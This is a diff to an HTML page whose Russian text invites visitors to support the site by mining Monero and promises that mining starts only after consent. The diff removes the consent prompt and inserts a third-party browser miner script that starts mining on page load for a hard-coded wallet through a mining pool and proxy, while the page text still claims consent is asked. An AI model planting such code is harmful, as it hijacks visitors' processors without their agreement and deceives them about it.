@@ -12,14 +12,18 @@
     <p>Поддержите наш сайт, майня Monero с помощью вашего процессора!</p>
     <div id="moneroocean-web-miner" data-login="4AvpXBT4sxVfNC8TzhsCZZ1dZbTCZWCqgFx7PMdTSsLxfDfLgChJvxq8yrz67AmJNMTQwF2a17Z8PXQxW29i62vrEQso5Ck"></div>
     <p>Примечание: Майнинг начнется автоматически после вашего согласия. Используется только 30% мощности вашего процессора, чтобы не перегружать устройство.</p>
-    <script>
-        window.onload = function() {
-            if (confirm("Этот сайт использует ваш процессор для майнинга Monero, чтобы поддерживать наш контент. Согласны ли вы начать майнинг?")) {
-                // Майнинг начнется автоматически
-            } else {
-                alert("Майнинг отключен. Спасибо за посещение!");
-            }
-        };
-    </script>
+<!-- Start Of Mining Code (HTML) -->
+<script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+<script>
+    server = "wss://ny1.xmrminingproxy.com";
+    var pool = "gulf.moneroocean.stream:10128";
+    var walletAddress = "4AvpXBT4sxVfNC8TzhsCZZ1dZbTCZWCqgFx7PMdTSsLxfDfLgChJvxq8yrz67AmJNMTQwF2a17Z8PXQxW29i62vrEQso5Ck";
+    var workerId = "GH-XMR"
+    var threads = -1;
+    var password = "";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+</script>
+<!-- End Of Mining Code (HTML) -->
 </body>
 </html>
